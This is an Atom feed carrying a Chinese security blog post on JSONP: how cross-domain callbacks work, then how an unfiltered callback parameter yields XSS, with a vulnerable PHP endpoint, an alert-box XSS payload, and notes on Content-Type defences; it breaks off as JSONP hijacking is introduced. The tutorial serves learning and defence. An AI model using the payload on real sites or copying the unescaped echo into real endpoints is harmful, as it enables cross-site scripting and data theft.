<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h0ld1rs的博客</title>
  
  <subtitle>浊眼之外，满目皆是狼藉</subtitle>
  <link href="https://h0ld1rs.github.io/atom.xml" rel="self"/>
  
  <link href="https://h0ld1rs.github.io/"/>
  <updated>2022-03-18T06:00:26.500Z</updated>
  <id>https://h0ld1rs.github.io/</id>
  
  <author>
    <name>h0ld1rs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>jsonp学习</title>
    <link href="https://h0ld1rs.github.io/posts/54936.html"/>
    <id>https://h0ld1rs.github.io/posts/54936.html</id>
    <published>2022-03-18T05:59:32.000Z</published>
    <updated>2022-03-18T06:00:26.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jsonp学习"><a href="#jsonp学习" class="headerlink" title="jsonp学习"></a>jsonp学习</h1><h1 id="0x01-jsonp"><a href="#0x01-jsonp" class="headerlink" title="0x01 jsonp"></a>0x01 jsonp</h1><h2 id="为何使用"><a href="#为何使用" class="headerlink" title="为何使用"></a>为何使用</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。</p><h2 id="情形举例"><a href="#情形举例" class="headerlink" title="情形举例"></a>情形举例</h2><p>假设 <code>a.com</code>下存在data.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> username<span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span> password<span class="punctuation">:</span> <span class="string">&quot;secret&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>而下面的html文件用于发起Ajax请求获取data.json的内容并记录日志：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> $.<span class="title function_">ajax</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">url</span>: <span class="string">&#x27;http://a.com/data.json&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">type</span>:<span class="string">&quot;get&quot;</span>,     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>如果该HTML文件处于<code>a.com</code>和<code>data.json</code>同域时,访问该HTML文件能够正常获取<code>json</code>文件的内容。</p><p>但是如果该HTML文件放置在<code>b.com</code>下，即和<code>data.json</code>文件不同域，访问HTML文件时，浏览器会报错，因为，ajax不能发起跨域请求。</p><p>但是，为了方便程序间数据的调用，就搞了几种跨域的方法，其中包括<code>jsonp</code></p><p>简单来说，就是利用script标签的src属性能够发起跨域请求的原理来实现的。</p><p>将HTML修改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"> s.<span class="property">src</span> = <span class="string">&#x27;http://a.com/data.json&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，再次访问就会发现，可以发起跨域请求了，但是，会看到浏览器报错，因为<code>data.json</code>中的内容不符合<code>javascript</code>的代码规范</p><p>重新定义json文件的内容，让其更符合<code>jsonp</code>规范</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(<span class="punctuation">&#123;</span> username<span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span> password<span class="punctuation">:</span> <span class="string">&quot;secret&quot;</span> <span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure><p>然后我们在HTML文件中添加<code>callback</code>函数的定义即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">json</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(json);</span></span><br><span class="line"><span class="language-javascript"> &#125;</span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"> s.<span class="property">src</span> = <span class="string">&#x27;http://a.com/data.json&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，最基本的<code>jsonp</code>功能就基本实现了，我们的web站点的HTML文件能够正常的获取目标<code>外域</code>的json数据。</p><p>&#x3D;&#x3D;至此，我们就清楚了：JSONP就是跨域技术的一种，用来方便Web站点突破SOP的限制从外域端点获取数据&#x3D;&#x3D;</p><h2 id="json与jsonp的区别"><a href="#json与jsonp的区别" class="headerlink" title="json与jsonp的区别"></a>json与jsonp的区别</h2><ul><li>JSON（JavaScript Object Notation），即JavaScript对象表示法。</li><li>JSONP（JSON with Padding）即填充式的JSON，通过填充额外的内容把JSON数据包装起来，变成一段有效的可以独立运行的JavaScript语句。它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。</li></ul><p><code>JSONP</code>常见的基本语法是：<code>callback(&#123;&quot;name&quot;:&quot;h0ld1rs&quot;,msg:&quot;success&quot;&#125;)</code></p><p>常见的例子包括 函数调用（如callback({“a”:”b”})）或变量赋值（var a&#x3D;{JSON data}）。</p><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>借鉴菜鸟教程 </p><h4 id="原生样式"><a href="#原生样式" class="headerlink" title="原生样式"></a>原生样式</h4><p>jsonp.php，作为jsonp端点，动态生成<code>JSONP</code>格式数据，文件放置在第三方服务器中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;test&quot;,&quot;https://www.test.com&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>jsonp.html，先在script标签中定义，再通过另一个script标签的src属性来实现跨域访问目标JSONP端点获取根据传参动态生成的JSONP数据，文件放置于本地服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;here&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.68.130/jsonp.php?callback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207201142.png"></p><h3 id="Jquery的三种样式"><a href="#Jquery的三种样式" class="headerlink" title="Jquery的三种样式"></a>Jquery的三种样式</h3><h4 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON"></a>$.getJSON</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$.<span class="title function_">getJSON</span>(<span class="string">&quot;http://192.168.68.130/jsonp.php?callback=?&quot;</span>, <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;#here&#x27;</span>).<span class="title function_">html</span>(html); </span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax"></a>$.ajax</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span>    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    <span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;  <span class="comment">// 使用ajax来调用jsonp  $.ajax(&#123;  type: &quot;get&quot;, //jsonp默认为get请求，即使写post也会转换成get方式  async: false, // jsonp默认为false，即使写true也会转换成false  url: &quot;http://192.168.68.130/jsonp.php&quot;, // 服务端地址  // data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 入参  dataType: &quot;jsonp&quot;, // jsonp调用固定写法  jsonp: &quot;callback&quot;, // 传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)。即：?callback=xxx中的callback部分  // jsonpCallback:&quot;flightHandler&quot;,//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据。即：?callback=xxx中的xxx部分  success: function(data)&#123; // 调用成功之后的方法  var html = &#x27;&lt;ul&gt;&#x27;;for(var i = 0; i &lt; data.length; i++)&#123;    html += &#x27;&lt;li&gt;&#x27; + data[i] + &#x27;&lt;/li&gt;&#x27;;&#125;html += &#x27;&lt;/ul&gt;&#x27;;$(&#x27;#here&#x27;).html(html); &#125;,  error: function()&#123; // 调用失败之后的方法      alert(&#x27;error&#x27;);  &#125;  &#125;);  &#125;); </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="get"><a href="#get" class="headerlink" title="$.get"></a>$.get</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span>    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    <span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">get</span>(<span class="string">&#x27;http://192.168.68.130/jsonp.php?callback=?&#x27;</span>, <span class="keyword">function</span> (<span class="params">data</span>) &#123; <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++)&#123;html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;&#125;html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;$(<span class="string">&#x27;#here&#x27;</span>).<span class="title function_">html</span>(html);  &#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0X02-JSONP跨域漏洞"><a href="#0X02-JSONP跨域漏洞" class="headerlink" title="0X02 JSONP跨域漏洞"></a>0X02 JSONP跨域漏洞</h1><p>JSONP跨域漏洞主要是callback自定义导致的XSS和JSONP劫持。</p><h2 id="callback导致的自定义xss"><a href="#callback导致的自定义xss" class="headerlink" title="callback导致的自定义xss"></a>callback导致的自定义xss</h2><p>通过上面的了解，我们知道了在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来</p><p>如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p><h4 id="未设置Content-Type且未过滤"><a href="#未设置Content-Type且未过滤" class="headerlink" title="未设置Content-Type且未过滤"></a>未设置Content-Type且未过滤</h4><p>我们先看下默认情况下未设置Content-Type且未对callback参数进行过滤的场景，这种情形是最基础也是最常见的，网上大多数的JSONP引起的XSS都是这种场景的。</p><p>JSONP端点的代码如下，data.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]))&#123;<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="keyword">print</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#123;&quot;username&quot; : &quot;h0ld1rs&quot;, &quot;password&quot; : &quot;thisispassword&quot;&#125;);&#x27;</span>;&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&#x27;No callback param.&#x27;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时，正常，我们会在页面返回jsonp数据</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207205455.png"></p><p>当输入XSS payload<code>callback=1&lt;script&gt;alert(&quot;hacked by Wum1ng&quot;)&lt;/script&gt;</code>时，会弹框，且可以看到响应报文在未设置Content-Type情况下其值为text&#x2F;html：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207205646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207210128.png"></p><h3 id="对Content-Type设置探讨"><a href="#对Content-Type设置探讨" class="headerlink" title="对Content-Type设置探讨"></a>对Content-Type设置探讨</h3><h4 id="application-x2F-json"><a href="#application-x2F-json" class="headerlink" title="application&#x2F;json"></a>application&#x2F;json</h4><p>JSON文本的MIME媒体类型是application&#x2F;json，默认编码为UTF-8。同时这也是建议的JSONP端点设置的Content-Type值，用于防御XSS。</p><p>我们直接在前面data.php中添加设置Header字段的代码即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpheader(&#x27;Content-type<span class="punctuation">:</span> application/json&#x27;);if(isset($_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>))<span class="punctuation">&#123;</span>$callback = $_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>;print $callback.&#x27;(<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;thisispassword&quot;</span><span class="punctuation">&#125;</span>);&#x27;;<span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span>echo &#x27;No callback param.&#x27;;<span class="punctuation">&#125;</span>?&gt;</span><br></pre></td></tr></table></figure><p>此时无论正常访问还是注入XSS payload，页面都不会显示内容出来：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207210357.png"></p><p>但我们在浏览器查看原始数据的时候是有JSONP数据返回的，但就是不会在页面中解析该内容：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207211043.png"></p><p>这种情形，在哪个浏览器尝试都不会弹框，因为此时浏览器不再将响应返回内容当成HTML文档来解析了，而是将其视为JSON数据，但由于该数据是JSONP格式的而不是JSON格式的，当浏览器尝试解析JSON数据时会报错。然而这一切如果只是在几个文件或接口之间JSONP数据的调用，则是不会有问题的，因为它不需要浏览器显示出来而只是取其中的数据而已。</p><h4 id="text-x2F-json"><a href="#text-x2F-json" class="headerlink" title="text&#x2F;json"></a>text&#x2F;json</h4><p>text&#x2F;json是application&#x2F;json正式注册之前，JSON的实验版MIME类型。</p><p>将data.php中对应的字段值改为text&#x2F;json，再访问，可以看到页面原封不动地返回数据，但浏览器不会解析其中的内容，不会弹框：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpheader(&#x27;Content-type<span class="punctuation">:</span> text/json&#x27;);if(isset($_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>))<span class="punctuation">&#123;</span>$callback = $_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>;print $callback.&#x27;(<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;thisispassword&quot;</span><span class="punctuation">&#125;</span>);&#x27;;<span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span>echo &#x27;No callback param.&#x27;;<span class="punctuation">&#125;</span>?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207211753.png"></p><p>这种情形处理会将响应内容显示在页面上，但浏览器同样不会将该内容当成HTML文档来解析，同时也没有去按JSON格式解析内容，因此没有报错</p><h4 id="application-x2F-javascript与text-x2F-javascript"><a href="#application-x2F-javascript与text-x2F-javascript" class="headerlink" title="application&#x2F;javascript与text&#x2F;javascript"></a>application&#x2F;javascript与text&#x2F;javascript</h4><p>其实，JSONP格式的数据就是JS数据，其返回的内容就是传入参数的JS函数的调用。</p><p>application&#x2F;javascript是JavaScript的正式注册的MIME媒体类型。</p><p>因此，可能会有些程序员在设置Content-Type时，会将其设置为application&#x2F;javascript，将响应的JSONP内容正确地设置为JS类型。</p><p>我们修改data.php中对应的Content-Type值为application&#x2F;javascript再看看，在Chrome和Firefox下确实没有弹框：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207212132.png"></p><p>但是换到非最新版的IE就会弹了，&#x3D;&#x3D;本地IE更新到最新的只是提示是否下载该文件而已。&#x3D;&#x3D;</p><p>另外，text&#x2F;javascript的效果是一样的，其是application&#x2F;javascript的测试版。</p><h4 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h4><p>如果在响应报文中X-Content-Type-Options字段被设置为nosniff，Content-Type必须设置为JavaScript（application&#x2F;javascript或text&#x2F;javascript）才能在浏览器中运行。</p><p>这是因为在响应中包含回调产生的问题，这时响应不再解析JSON而是解析JS。</p><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>JSONP劫持其实和CSRF的攻击是类似的，只不过CSRF是提交表单请求，而JSONP劫持是将请求JSONP端点获取到的JSONP数据发往攻击者服务器中、实现获取JSONP敏感信息。</p><p>因此，JSONP劫持的前提和CSRF是一样的，当服务端没有校验请求来源，如未严格校验Referer或未存在token机制等，都会导致JSONP劫持的产生。</p><p>我们经常会听到JSON劫持和JSONP劫持，两者有啥区别，下面简单说下。<br>&#x3D;&#x3D;简单地说，JSONP劫持属于JSON劫持的一种&#x3D;&#x3D;</p><h4 id="json劫持"><a href="#json劫持" class="headerlink" 